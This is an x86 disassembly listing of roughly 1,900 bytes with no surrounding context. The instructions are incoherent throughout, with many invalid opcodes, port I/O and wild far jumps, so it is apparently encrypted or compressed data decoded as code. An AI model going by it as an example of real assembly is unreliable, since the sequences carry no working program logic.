  416a2e:	xchg   ebp,ebx
  416a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a31:	into   
  416a32:	ss dec ebp
  416a34:	into   
  416a35:	push   eax
  416a36:	and    al,0x7d
  416a38:	inc    ebp
  416a39:	sbb    edx,DWORD PTR [bp-0x7c]
  416a3d:	lods   al,BYTE PTR ds:[esi]
  416a3e:	sahf   
  416a3f:	and    eax,0x1859ca6e
  416a44:	mov    edi,0x45ae8f86
  416a49:	cld    
  416a4a:	int    0x44
  416a4c:	sbb    DWORD PTR [edi+0x66d08c9f],0x3d
  416a53:	fstp   st(0)
  416a55:	sub    ebp,esi
  416a57:	dec    ebx
  416a58:	xor    eax,0x56c93b72
  416a5d:	fsub   QWORD PTR [edi-0x532ecf77]
  416a63:	sub    ebx,DWORD PTR [edx+0x60]
  416a66:	xor    al,0x2
  416a68:	xchg   esi,eax
  416a69:	inc    esp
  416a6a:	lods   al,BYTE PTR ds:[esi]
  416a6b:	sbb    DWORD PTR [edi],edx
  416a6d:	jecxz  0x416ada
  416a6f:	jb     0x416a04
  416a71:	mov    dh,BYTE PTR [ebp+0x3ee99be3]
  416a77:	mov    ecx,0x49f166ab
  416a7c:	xor    eax,0x1393e884
  416a81:	xlat   BYTE PTR ds:[ebx]
  416a82:	scas   al,BYTE PTR es:[edi]
  416a83:	xchg   esp,eax
  416a84:	mov    dh,0xae
  416a86:	inc    ecx
  416a87:	cvttps2pi mm2,QWORD PTR [ecx-0x2565ca6a]
  416a8e:	inc    esp
  416a8f:	fcmovne st,st(4)
  416a91:	pop    ebp
  416a92:	mov    edx,0x47df21c8
  416a97:	xchg   ebp,eax
  416a98:	add    eax,0xc5c908be
  416a9d:	(bad)  
  416a9f:	push   cs
  416aa0:	cmp    esp,DWORD PTR [ebx]
  416aa2:	jnp    0x416a8b
  416aa4:	jp     0x416a2c
  416aa6:	jl     0x416a3e
  416aa8:	add    eax,ecx
  416aaa:	jle    0x416ada
  416aac:	ret    
  416aad:	call   0x4bdda106
  416ab2:	pop    ebp
  416ab3:	mov    BYTE PTR [edx+eiz*1],cl
  416ab6:	push   edx
  416ab7:	sbb    eax,0xc34413cb
  416abc:	pop    esp
  416abd:	add    bl,BYTE PTR ds:0xb650c4eb
  416ac3:	push   ds
  416ac4:	scas   al,BYTE PTR es:[edi]
  416ac5:	mov    cl,0xbe
  416ac7:	adc    dh,BYTE PTR [esi]
  416ac9:	mov    dl,0x22
  416acb:	addr16 mov dh,0x9c
  416ace:	mov    DWORD PTR ds:0x155c82df,ebp
  416ad4:	sub    BYTE PTR [edi-0x58e9f8ee],dh
  416ada:	cli    
  416adb:	adc    al,0x89
  416add:	mov    edx,0xaf0b7bd7
  416ae2:	(bad)  
  416ae3:	mov    cl,0x83
  416ae5:	xchg   DWORD PTR [ebx],esp
  416ae7:	pop    ebx
  416ae8:	xchg   esi,eax
  416ae9:	mov    edi,0xe7f6fe05
  416aee:	pop    ds
  416aef:	std    
  416af0:	(bad)  
  416af1:	push   edi
  416af2:	xchg   ebx,eax
  416af3:	push   ebp
  416af4:	movzx  esp,BYTE PTR [edi+0x17247abf]
  416afb:	mov    al,ds:0x3c0a0d35
  416b00:	aas    
  416b01:	jp     0x416af0
  416b03:	xchg   ebp,eax
  416b04:	daa    
  416b05:	add    al,0x89
  416b08:	loopne 0x416ad3
  416b0a:	pop    ecx
  416b0b:	mov    BYTE PTR [edx+0x42],bl
  416b0e:	(bad)
  416b12:	ja     0x416b64
  416b14:	mov    ds:0x4707bd36,al
  416b19:	scas   eax,DWORD PTR es:[edi]
  416b1a:	adc    BYTE PTR [edi+ebx*2],bl
  416b1d:	ss adc al,0xd4
  416b20:	sub    BYTE PTR [edi+0x46],0x3e
  416b24:	xchg   edx,eax
  416b25:	pop    edi
  416b26:	stos   DWORD PTR es:[edi],eax
  416b27:	icebp  
  416b28:	or     BYTE PTR [ecx-0x45fa88d4],ah
  416b2e:	push   ebx
  416b2f:	dec    ebx
  416b30:	js     0x416b2f
  416b32:	sbb    dl,BYTE PTR [eax]
  416b34:	sar    eax,1
  416b36:	mov    ecx,?
  416b38:	nop
  416b39:	addr16 pmovmskb ecx,mm5
  416b3d:	sbb    edx,DWORD PTR [ecx+0x31]
  416b40:	lahf   
  416b41:	sbb    edi,ebx
  416b43:	sbb    BYTE PTR [eax-0x47],ch
  416b46:	jns    0x416bc0
  416b48:	push   edi
  416b49:	sub    al,0xe7
  416b4b:	in     al,0xea
  416b4d:	jl     0x416b45
  416b4f:	aaa    
  416b50:	inc    sp
  416b52:	sar    DWORD PTR [esi+0x31ab43ab],1
  416b58:	sbb    BYTE PTR [ecx+0x383a2440],dl
  416b5e:	push   cs
  416b5f:	mov    ecx,0xaac6f012
  416b64:	psubsw mm2,QWORD PTR [edi+0x44]
  416b68:	push   ebp
  416b69:	fs adc edx,eax
  416b6c:	jecxz  0x416b95
  416b6e:	cwde   
  416b6f:	push   0x187c07b5
  416b74:	(bad)  
  416b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b76:	adc    cl,BYTE PTR [ebx-0x665f17b5]
  416b7c:	ret    
  416b7d:	sub    eax,0x9bc0fb1a
  416b82:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  416b84:	push   es
  416b85:	mov    DWORD PTR [esi-0x47efaf9],eax
  416b8b:	jle    0x416b67
  416b8d:	(bad)  
  416b8e:	jmp    0x35f44ca0
  416b93:	stc    
  416b94:	or     eax,0xae56a2bb
  416b99:	loop   0x416b8e
  416b9b:	push   es
  416b9c:	pop    ecx
  416b9d:	sbb    ebx,eax
  416b9f:	call   0xcb61:0x346ac146
  416ba6:	mov    bl,0x9f
  416ba8:	shl    ebx,1
  416baa:	adc    eax,0x915e14c7
  416baf:	std    
  416bb0:	adc    dh,BYTE PTR [ecx+0x5f4402f8]
  416bb6:	dec    edi
  416bb7:	cmc    
  416bb8:	sub    ah,dl
  416bba:	(bad)  
  416bbb:	and    DWORD PTR [ecx+0x15],esp
  416bbe:	scas   eax,DWORD PTR es:[edi]
  416bbf:	pop    esi
  416bc0:	out    0xac,eax
  416bc2:	add    ebp,DWORD PTR [ecx]
  416bc4:	mov    esp,0xe44254fa
  416bc9:	xchg   ebp,eax
  416bca:	lock or al,0x15
  416bcd:	cmc    
  416bce:	mov    al,BYTE PTR [ebx-0x41347983]
  416bd4:	gs nop
  416bd6:	out    dx,eax
  416bd7:	inc    ecx
  416bd8:	jo     0x416bd4
  416bda:	dec    esp
  416bdb:	popf   
  416bdc:	xor    ecx,DWORD PTR [ebx]
  416bde:	gs aaa 
  416be0:	and    al,0x99
  416be2:	out    dx,eax
  416be3:	popa   
  416be4:	adc    BYTE PTR [edx+eiz*2+0x52],cl
  416be8:	(bad)  
  416bea:	xchg   ebx,eax
  416beb:	cmp    BYTE PTR [esp+edi*4+0x5b],dl
  416bef:	dec    ebp
  416bf0:	lods   eax,DWORD PTR ds:[esi]
  416bf1:	popa   
  416bf2:	outs   dx,DWORD PTR ds:[esi]
  416bf3:	jnp    0x416b7b
  416bf5:	mov    ch,BYTE PTR [esi+0x22]
  416bf8:	push   edx
  416bf9:	cwde   
  416bfa:	in     al,dx
  416bfb:	ret    
  416bfc:	ins    BYTE PTR es:[edi],dx
  416bfd:	shl    ah,0x6
  416c00:	mov    dh,0x24
  416c02:	in     eax,0x4c
  416c04:	repnz sub DWORD PTR [ecx],0x25abd8e6
  416c0b:	inc    ecx
  416c0c:	or     bl,BYTE PTR [edi-0x17a2dce6]
  416c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c13:	mov    edx,0xdb0305ea
  416c18:	fsub   QWORD PTR [ebx+0x37fae945]
  416c1e:	push   edx
  416c1f:	cld    
  416c20:	sbb    al,0x19
  416c22:	dec    ebx
  416c23:	daa    
  416c24:	jg     0x416c40
  416c26:	jnp    0x416c1e
  416c28:	xchg   edx,eax
  416c29:	arpl   WORD PTR [ebx],sp
  416c2b:	je     0x416c39
  416c2d:	mov    esi,0x26b51c49
  416c32:	ins    BYTE PTR es:[edi],dx
  416c33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c34:	ja     0x416bc0
  416c36:	ja     0x416bf8
  416c38:	xor    eax,0xde964275
  416c3d:	pusha  
  416c3e:	pop    eax
  416c3f:	test   eax,0xc5d6fa51
  416c44:	inc    ebx
  416c45:	stos   DWORD PTR es:[edi],eax
  416c46:	mov    ch,0xdb
  416c48:	arpl   WORD PTR [eax-0x43],di
  416c4b:	sub    dh,ch
  416c4d:	mov    ds:0x3f57630a,eax
  416c52:	adc    ebx,0x3744d60b
  416c58:	arpl   sp,cx
  416c5a:	or     BYTE PTR [edx],bh
  416c5c:	rcl    dl,1
  416c5e:	dec    edi
  416c5f:	xchg   BYTE PTR [ebx],cl
  416c61:	mov    bl,0xac
  416c63:	call   0x41f017e7
  416c68:	fiadd  WORD PTR [ecx-0x14]
  416c6b:	ins    BYTE PTR es:[edi],dx
  416c6c:	jb     0x416c45
  416c6e:	and    eax,0xafc53320
  416c73:	sbb    al,0xe1
  416c75:	mov    al,ds:0xc9c46e17
  416c7a:	pop    edx
  416c7b:	sti    
  416c7c:	call   0xde37:0x5a1992c0
  416c83:	enter  0x4b0,0x69
  416c87:	push   es
  416c88:	xchg   edi,esi
  416c8a:	mov    es,WORD PTR [esi+0x22e1f330]
  416c90:	push   ebp
  416c91:	xchg   edi,eax
  416c92:	pop    esi
  416c93:	pop    esp
  416c94:	popa   
  416c95:	das    
  416c96:	and    esi,DWORD PTR [esi-0x1fde40c1]
  416c9c:	inc    ebx
  416c9d:	jp     0x416cd5
  416c9f:	dec    ebp
  416ca0:	sub    ebx,DWORD PTR [edx+edi*2-0x2a07407d]
  416ca7:	fsub   DWORD PTR [ecx]
  416ca9:	mov    ebp,ebx
  416cab:	lds    ecx,FWORD PTR [eax]
  416cad:	jp     0x416d08
  416caf:	jae    0x416d00
  416cb1:	inc    ebx
  416cb2:	sbb    ebp,edx
  416cb4:	(bad)  
  416cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cb6:	xchg   edx,eax
  416cb7:	repz fst QWORD PTR [ecx]
  416cba:	and    BYTE PTR [ebp-0x3da748fd],dh
  416cc0:	pop    edx
  416cc1:	mov    bl,0x6f
  416cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cc4:	or     esi,esp
  416cc6:	pop    edx
  416cc7:	jns    0x416cdb
  416cc9:	loopne 0x416d15
  416ccb:	aam    0xcc
  416ccd:	push   edx
  416cce:	xchg   esp,eax
  416ccf:	popf   
  416cd0:	fstp   QWORD PTR [eax-0x3c355cdb]
  416cd6:	mov    DWORD PTR [ebp+0x64],esi
  416cd9:	jne    0x416c92
  416cdb:	add    ch,BYTE PTR [eax]
  416cdd:	loop   0x416c61
  416cdf:	add    dh,al
  416ce1:	pop    ecx
  416ce2:	mov    eax,ds:0x39a5bae6
  416ce7:	retf   
  416ce8:	pop    ebp
  416ce9:	stos   DWORD PTR es:[edi],eax
  416cea:	cmp    eax,0x453bb1f6
  416cef:	xor    bh,ah
  416cf1:	out    dx,eax
  416cf2:	fldenv [ecx]
  416cf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cf5:	and    DWORD PTR [ecx-0x3f],0xffffffe4
  416cf9:	lods   eax,DWORD PTR ds:[esi]
  416cfa:	pop    ss
  416cfb:	in     al,0x12
  416cfd:	push   ebp
  416cfe:	fdivr  st(6),st
  416d00:	jle    0x416cfe
  416d02:	ins    DWORD PTR es:[edi],dx
  416d03:	xor    al,0x10
  416d05:	xor    eax,0xf089ff3d
  416d0a:	pop    ebp
  416d0b:	dec    ebp
  416d0c:	daa    
  416d0d:	xor    esp,ebp
  416d0f:	repz mov WORD PTR ds:0x582d,es
  416d15:	stos   DWORD PTR es:[edi],eax
  416d16:	sbb    al,0x67
  416d18:	out    0x97,eax
  416d1a:	cdq    
  416d1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d1c:	xchg   ecx,eax
  416d1d:	mov    ds:0x3abcbd1b,eax
  416d22:	lods   eax,DWORD PTR ds:[esi]
  416d23:	nop
  416d24:	mov    ebp,0x73f6ea94
  416d29:	xchg   edi,eax
  416d2a:	pushf  
  416d2b:	data16 sahf 
  416d2d:	sbb    DWORD PTR [edi+0xe],0x231710a7
  416d34:	scas   al,BYTE PTR es:[edi]
  416d35:	mov    ds:0xd35e80d3,al
  416d3a:	retf   0xc903
  416d3d:	lea    ebp,[ecx]
  416d3f:	ret    
  416d40:	(bad)  
  416d41:	mov    cl,0xf0
  416d43:	or     al,0x82
  416d45:	mov    esp,0xd3aa6c03
  416d4a:	or     bh,ah
  416d4c:	adc    eax,0x6ddd746d
  416d51:	imul   ebp,DWORD PTR [ebx+ebp*2+0x469883a6],0x5c
  416d59:	and    dh,BYTE PTR [edi+ebp*8+0x13]
  416d5d:	sbb    BYTE PTR [bx+di+0x2ffc],ch
  416d62:	cmp    dl,BYTE PTR [ecx+0x6]
  416d65:	pop    ebp
  416d66:	or     al,0x93
  416d68:	addr16 xchg ebx,eax
  416d6a:	add    eax,eax
  416d6c:	push   edi
  416d6d:	loop   0x416dbf
  416d6f:	imul   bl
  416d71:	xor    DWORD PTR [edx-0xe],ecx
  416d74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d75:	gs nop
  416d77:	sub    ch,cl
  416d79:	cmp    DWORD PTR [ecx-0x67],edx
  416d7c:	stos   DWORD PTR es:[edi],eax
  416d7d:	icebp  
  416d7e:	cs jle 0x416d8e
  416d81:	idiv   dl
  416d83:	call   0xd8a7:0x69641f76
  416d8a:	jmp    0xaeea4027
  416d8f:	test   BYTE PTR [esi],ch
  416d91:	mov    edx,0xf5517dec
  416d96:	jo     0x416d4b
  416d98:	mov    ch,0x8b
  416d9a:	jl     0x416de4
  416d9c:	push   0xffffff8d
  416d9e:	outs   dx,BYTE PTR ds:[esi]
  416d9f:	add    esi,edx
  416da1:	mov    esi,0xa800e75f
  416da6:	sbb    al,0xb
  416da8:	imul   ebp,DWORD PTR ds:0x4a6173bf,0xffffffd0
  416daf:	fs xor eax,0xe86e94b7
  416db5:	inc    ebx
  416db6:	jecxz  0x416d7d
  416db8:	push   0xffffffcd
  416dba:	mov    esp,edi
  416dbc:	sub    DWORD PTR [ebp-0x5fae59bd],0x46
  416dc3:	inc    ebx
  416dc4:	add    esi,ebp
  416dc6:	pop    eax
  416dc7:	loop   0x416dc3
  416dc9:	sbb    cl,ah
  416dcb:	mov    BYTE PTR [eax+eiz*4],ah
  416dce:	out    dx,eax
  416dcf:	push   cs
  416dd0:	addr16 (bad) 
  416dd2:	mov    ch,0x7b
  416dd4:	test   al,0x9a
  416dd6:	pop    es
  416dd7:	lods   eax,DWORD PTR ds:[esi]
  416dd8:	pop    edx
  416dd9:	je     0x416e1b
  416ddb:	sub    eax,0x1f85ea52
  416de0:	rcl    BYTE PTR [edx*4+0x4ff748bb],1
  416de7:	or     ecx,DWORD PTR [edi]
  416de9:	pcmpgtb mm2,mm4
  416dec:	sbb    al,0x18
  416dee:	jle    0x416df8
  416df0:	jle    0x416db5
  416df2:	into   
  416df3:	je     0x416e49
  416df5:	and    al,0x61
  416df7:	jge    0x416d8c
  416df9:	jb     0x416e6c
  416dfb:	stos   DWORD PTR es:[edi],eax
  416dfc:	and    eax,0xc950fc3
  416e01:	sub    BYTE PTR [edx-0x100ae79],dh
  416e07:	mov    bl,0xe6
  416e09:	mov    edx,0x9badadc
  416e0e:	mov    ds:0x653b12a9,eax
  416e13:	fst    DWORD PTR [ebx+edi*8-0xd]
  416e17:	jmp    0x57a4:0x16405b3b
  416e1e:	in     al,0x3e
  416e20:	shl    BYTE PTR [eax+0x2c879484],cl
  416e26:	xchg   edx,eax
  416e27:	sub    dh,dl
  416e29:	inc    edx
  416e2a:	mov    edi,DWORD PTR [ebx]
  416e2c:	test   DWORD PTR [edx+0x362b42c8],edx
  416e32:	out    dx,al
  416e33:	test   eax,0x6a519b1b
  416e38:	ja     0x416e53
  416e3a:	rcr    ebp,cl
  416e3c:	icebp  
  416e3d:	add    DWORD PTR [edx+edx*4],esi
  416e40:	mov    WORD PTR [eax],ss
  416e42:	nop
  416e43:	test   BYTE PTR [edi],al
  416e45:	iret   
  416e46:	sbb    ah,BYTE PTR [esi]
  416e48:	inc    ebx
  416e49:	je     0x416e0f
  416e4b:	repnz push edi
  416e4d:	leave  
  416e4e:	sar    DWORD PTR [esi],0xf4
  416e51:	xor    al,0x5a
  416e53:	mov    ds:0x8130551d,al
  416e58:	xor    al,0xfc
  416e5a:	push   esp
  416e5b:	aaa    
  416e5c:	and    eax,0xd4b93d11
  416e61:	mov    WORD PTR [esi+0x2580ecae],gs
  416e67:	scas   eax,DWORD PTR es:[edi]
  416e68:	jb     0x416e76
  416e6a:	or     al,0x4
  416e6c:	push   edx
  416e6d:	out    0x51,al
  416e6f:	mov    esp,0xddfac1a9
  416e74:	mov    BYTE PTR [esp+eiz*8-0x30],bh
  416e78:	fisubr WORD PTR [ebp+0x13592983]
  416e7e:	in     al,0x4e
  416e80:	sahf   
  416e81:	cdq    
  416e82:	and    DWORD PTR [ecx+edi*2],0xffffffbd
  416e86:	aas    
  416e87:	iret   
  416e88:	mov    ds:0x3ddd22e2,al
  416e8d:	jmp    0x2d4b27a9
  416e92:	adc    al,0xfc
  416e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e95:	push   es
  416e96:	mov    bl,0x38
  416e98:	jne    0x416ee3
  416e9a:	scas   eax,DWORD PTR es:[edi]
  416e9b:	cmc    
  416e9c:	adc    dh,BYTE PTR [eax]
  416e9e:	add    esp,ebx
  416ea0:	jnp    0x416e68
  416ea2:	adc    ecx,ebx
  416ea4:	arpl   WORD PTR [edx+0x75b55446],sp
  416eaa:	xchg   ebp,eax
  416eab:	mov    eax,0x8aaf3863
  416eb0:	cmp    eax,0x2c5e1687
  416eb5:	cmp    ebx,DWORD PTR [ebp-0x46]
  416eb8:	ss iret 
  416eba:	xchg   edx,eax
  416ebb:	pop    ecx
  416ebc:	xchg   ecx,eax
  416ebd:	dec    esi
  416ebe:	data16 out dx,al
  416ec0:	dec    edx
  416ec1:	icebp  
  416ec2:	xchg   DWORD PTR [edx-0x69],edx
  416ec5:	(bad)
  416ec9:	ds jecxz 0x416e6e
  416ecc:	or     DWORD PTR [eax+0x57],ebp
  416ecf:	(bad)  
  416ed0:	dec    ebp
  416ed1:	arpl   WORD PTR [ecx],di
  416ed3:	aaa    
  416ed4:	daa    
  416ed5:	sbb    BYTE PTR [esi-0x3b],ch
  416ed8:	nop
  416ed9:	add    BYTE PTR [edi],bl
  416edb:	adc    DWORD PTR [ebp+edi*4-0x19826233],esi
  416ee2:	data16 jecxz 0x416ec1
  416ee5:	pop    es
  416ee6:	pop    eax
  416ee7:	xchg   ecx,eax
  416ee8:	fimul  DWORD PTR [eax]
  416eea:	and    eax,0x9516b933
  416eef:	jmp    0xc1c6fa54
  416ef4:	sbb    BYTE PTR [eax],0x43
  416ef7:	ret    
  416ef8:	test   DWORD PTR [ebp-0x4f],esp
  416efb:	xor    BYTE PTR [eax+0x7ef3d3da],ah
  416f01:	scas   eax,DWORD PTR es:[edi]
  416f02:	add    dh,BYTE PTR [edi]
  416f04:	idiv   ch
  416f06:	jb     0x416eb4
  416f08:	push   ebx
  416f09:	test   eax,0x4c6aff0d
  416f0e:	xchg   ebx,eax
  416f0f:	xchg   ebx,eax
  416f10:	sbb    BYTE PTR [edx],0x55
  416f13:	es pop ebp
  416f15:	dec    esp
  416f16:	mov    dh,0xb7
  416f18:	fsin   
  416f1a:	adc    dh,dh
  416f1c:	sub    ecx,ebp
  416f1e:	in     eax,dx
  416f1f:	dec    ebp
  416f20:	(bad)  
  416f21:	mov    ds:0x128b696a,eax
  416f26:	or     eax,0xf2e43f39
  416f2b:	dec    ebp
  416f2c:	jmp    0x416f51
  416f2e:	test   BYTE PTR [edx+0x69328bdb],dl
  416f34:	cmc    
  416f35:	xor    edx,edx
  416f37:	jne    0x416f33
  416f39:	popf   
  416f3a:	ss push ds
  416f3c:	mov    edx,0xdb22fb5b
  416f41:	inc    esi
  416f42:	dec    ebx
  416f43:	inc    eax
  416f44:	push   ecx
  416f45:	imul   esp,DWORD PTR [edi],0x68
  416f48:	lahf   
  416f49:	xchg   DWORD PTR [eax-0x5713f31b],ebx
  416f4f:	jns    0x416f55
  416f51:	ins    DWORD PTR es:[edi],dx
  416f52:	fcomp  DWORD PTR [ecx+0x7aa3b30b]
  416f58:	ffree  st(3)
  416f5a:	dec    ebp
  416f5b:	sub    BYTE PTR [edi+esi*1-0x51],ah
  416f5f:	mov    cl,0x68
  416f61:	or     edx,ecx
  416f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f64:	pop    esp
  416f65:	in     al,0x5c
  416f67:	mov    al,0x36
  416f69:	sbb    bh,ah
  416f6b:	jnp    0x416f88
  416f6d:	push   ds
  416f6e:	pop    edx
  416f6f:	cmp    bh,BYTE PTR [edi+0x7417ca0a]
  416f75:	inc    ebx
  416f76:	das    
  416f77:	(bad)  
  416f78:	dec    ebp
  416f79:	adc    bh,BYTE PTR [ecx+0x75420488]
  416f7f:	xchg   ebp,eax
  416f80:	cmp    DWORD PTR [eax],esi
  416f82:	dec    edx
  416f83:	js     0x416f53
  416f85:	mul    BYTE PTR [eax+eax*1]
  416f88:	lods   eax,DWORD PTR ds:[esi]
  416f89:	inc    ecx
  416f8a:	mov    esp,0x730a03a3
  416f8f:	mov    BYTE PTR [edi-0x60],ah
  416f92:	dec    esp
  416f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f94:	jo     0x416fac
  416f96:	std    
  416f97:	aam    0xe4
  416f99:	rcl    DWORD PTR [eax-0x11524bef],0xc6
  416fa0:	dec    ecx
  416fa1:	shl    DWORD PTR [ecx],0x79
  416fa4:	mov    esi,0xf3e42e9b
  416fa9:	jnp    0x416f49
  416fab:	(bad)  
  416fad:	or     DWORD PTR [edi],edi
  416faf:	adc    BYTE PTR [ebp-0x132adc72],0x4b
  416fb6:	test   al,0x53
  416fb8:	fstp   DWORD PTR [ecx-0x5eeddf75]
  416fbf:	cwde   
  416fc0:	mov    ebp,0x7db9a8e3
  416fc5:	xchg   ecx,eax
  416fc6:	in     eax,dx
  416fc7:	imul   esp,edx,0xbe8894ec
  416fcd:	ins    DWORD PTR es:[edi],dx
  416fce:	cdq    
  416fcf:	push   0xfaa860f0
  416fd4:	in     eax,dx
  416fd5:	pop    eax
  416fd6:	xlat   BYTE PTR ds:[ebx]
  416fd7:	or     esp,DWORD PTR [ebx+0x1e]
  416fda:	pusha  
  416fdb:	jno    0x417020
  416fdd:	lods   eax,DWORD PTR ds:[esi]
  416fde:	(bad)  
  416fdf:	int    0xc2
  416fe1:	dec    edx
  416fe2:	mov    ds:0x59036707,al
  416fe7:	aaa    
  416fe8:	ror    BYTE PTR [ebx],1
  416fea:	lods   al,BYTE PTR ds:[esi]
  416feb:	gs icebp 
  416fed:	push   eax
  416fee:	jnp    0x416ffc
  416ff0:	dec    esi
  416ff1:	in     al,dx
  416ff2:	aam    0x7c
  416ff4:	int    0xb1
  416ff6:	add    al,0xda
  416ff8:	dec    esp
  416ff9:	cli    
  416ffa:	cmc    
  416ffb:	mov    edx,0x4b0f5fd2
  417000:	retf   0x416c
  417003:	iret   
  417004:	mov    dl,0xfc
  417006:	mov    ah,0x96
  417008:	cmp    edi,DWORD PTR [esi+0x6b]
  41700b:	imul   ebx,DWORD PTR [edi-0x5a],0xd07e8b22
  417012:	mov    ebp,0x63290c98
  417017:	loopne 0x417012
  417019:	sub    al,BYTE PTR ds:0x47abfcda
  41701f:	mov    ds:0xe3909e8,al
  417024:	outs   dx,DWORD PTR ds:[esi]
  417025:	addr16 push esp
  417027:	xchg   ecx,eax
  417028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417029:	call   0xa1fb:0x65f2df7
  417030:	(bad)  
  417031:	xlat   BYTE PTR ds:[ebx]
  417032:	pop    eax
  417033:	push   ss
  417034:	popa   
  417035:	sub    eax,0x144b6ab4
  41703a:	and    eax,0xb8d4ebe7
  41703f:	adc    BYTE PTR [ebp-0x411a61b9],bh
  417045:	shl    edx,cl
  417047:	lahf   
  417048:	cmp    bl,dl
  41704a:	in     al,dx
  41704b:	out    dx,eax
  41704c:	mov    ah,ah
  41704e:	add    DWORD PTR [ebp-0x46fe1a88],esp
  417054:	adc    eax,0x881a628
  417059:	mov    eax,cs:0xec978a71
  41705f:	lds    ebp,FWORD PTR [ebp+0x13]
  417062:	dec    ebp
  417063:	dec    edi
  417064:	inc    esp
  417065:	or     BYTE PTR [esi+0x10d3a23c],ah
  41706b:	xchg   edx,eax
  41706c:	js     0x417028
  41706e:	jmp    0xf1c2c211
  417073:	and    eax,0x7690a924
  417078:	pop    gs
  41707a:	jle    0x417003
  41707c:	cmc    
  41707d:	rcr    edx,cl
  41707f:	xor    BYTE PTR [ebx-0x64],bh
  417082:	xor    BYTE PTR [eax-0x38fdf65d],ch
  417088:	adc    ah,BYTE PTR [ebp-0x5c]
  41708b:	pcmpgtw mm1,QWORD PTR ds:0x21d3537b
  417092:	loopne 0x4170ec
  417094:	jne    0x4170c7
  417096:	mov    ebx,0x822da567
  41709b:	mov    ebp,0x330251fd
  4170a0:	dec    ecx
  4170a1:	or     eax,0x3bfa6b7a
  4170a6:	arpl   bx,ax
  4170a8:	leave  
  4170a9:	fidiv  WORD PTR [edx]
  4170ab:	pop    eax
  4170ac:	inc    ebx
  4170ad:	ins    DWORD PTR es:[edi],dx
  4170ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170af:	and    ch,BYTE PTR [ebx+0x7d]
  4170b2:	hlt    
  4170b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170b4:	scas   eax,DWORD PTR es:[edi]
  4170b5:	mov    eax,0xbd9aefc7
  4170ba:	adc    al,0x63
  4170bc:	push   ds
  4170bd:	test   BYTE PTR [ebx+0x79cb2d0c],al
  4170c3:	cwde   
  4170c4:	dec    DWORD PTR [esi+0xe9491c8]
  4170ca:	inc    eax
  4170cb:	push   edx
  4170cc:	cmp    DWORD PTR [edi],ecx
  4170ce:	sub    eax,DWORD PTR [edx+0x72cb3566]
  4170d4:	add    DWORD PTR [ebx+0x58],edi
  4170d7:	in     eax,dx
  4170d8:	es push ecx
  4170da:	iret   
  4170db:	inc    ebp
  4170dc:	ss icebp 
  4170de:	adc    DWORD PTR [edi+0x28],0xdddb002b
  4170e5:	pop    esp
  4170e6:	and    al,BYTE PTR [ebx]
  4170e8:	addr16 jg 0x41712c
  4170eb:	bound  eax,QWORD PTR [ecx+0x1d]
  4170ee:	xchg   ebp,eax
  4170ef:	out    dx,eax
  4170f0:	cmp    DWORD PTR [esp+ecx*4-0x38],edx
  4170f4:	xchg   esp,eax
  4170f5:	sub    al,0xaf
  4170f7:	loopne 0x4170c9
  4170f9:	mov    fs,WORD PTR ds:0x1c08b804
  4170ff:	std    
  417100:	imul   esi,DWORD PTR [esi+0x441114a9],0x3
  417107:	(bad)  
  417108:	test   DWORD PTR [edi-0xa7335b],0x1a3e914c
  417112:	mov    gs,WORD PTR [edx-0x723bf92d]
  417118:	sub    eax,0xda1acb4b
  41711d:	add    ah,BYTE PTR [eax-0x303914d6]
  417123:	jge    0x41715a
  417125:	stos   DWORD PTR es:[edi],eax
  417126:	jecxz  0x41712e
  417128:	fcom   st(4)
  41712a:	jmp    0x55b8a478
  41712f:	cld    
  417130:	mov    dh,0x57
  417132:	push   edi
  417133:	pop    es
  417134:	idiv   BYTE PTR [ebx]
  417136:	fimul  WORD PTR [esi-0x43]
  417139:	add    ecx,ebp
  41713b:	push   eax
  41713c:	retf   
  41713d:	scas   al,BYTE PTR es:[edi]
  41713e:	adc    DWORD PTR [edx],esp
  417140:	dec    edi
  417141:	mov    edi,0x30d3d779
  417146:	pop    esi
  417147:	add    ecx,edi
  417149:	fadd   DWORD PTR [ecx-0x27]
  41714c:	sub    BYTE PTR [esi+0x10],dh
  41714f:	int3   
  417150:	out    dx,al
  417151:	(bad)  
  417152:	out    0xe2,al
  417154:	cmp    eax,0xa82e4492
  417159:	mov    edi,0xa57f57a4
  41715e:	dec    ebx
  41715f:	push   0xfffffff1
  417161:	mov    esi,0x5a5d24d6
  417166:	or     BYTE PTR [edi-0x6774b11d],bl
  41716c:	jecxz  0x417189
  41716e:	adc    BYTE PTR [ebp+0x6e6f2cec],0x60
  417175:	and    ebp,DWORD PTR [edi+0x76]
  417178:	in     eax,dx
  417179:	lahf   
  41717a:	xchg   esi,eax
  41717b:	dec    ecx
  41717c:	inc    esi
  41717d:	sahf   
  41717e:	rol    BYTE PTR es:[edx-0x487a450b],1
  417185:	and    ebx,DWORD PTR [ebx+edx*4+0x7e]
  417189:	pop    esi
  41718a:	mov    bh,0x5b
  41718c:	sahf   
  41718d:	inc    edx
  41718e:	jmp    DWORD PTR [eax]
  417190:	inc    ebp
  417191:	jne    0x417176
  417193:	or     BYTE PTR [edi+0x2965f6f5],ah
  417199:	or     BYTE PTR [esp+edi*1+0x3b],0xb7
  41719e:	inc    esi
  41719f:	test   eax,0x4131f5ac
  4171a4:	xor    BYTE PTR [ebx],cl
  4171a6:	cdq    
  4171a7:	mov    ch,0x3f
  4171a9:	arpl   WORD PTR [ebx-0x57adb08a],bp
  4171af:	enter  0x1cfa,0xe5
  4171b3:	into   
  4171b4:	inc    edx
  4171b5:	xchg   ecx,eax
  4171b6:	dec    esi
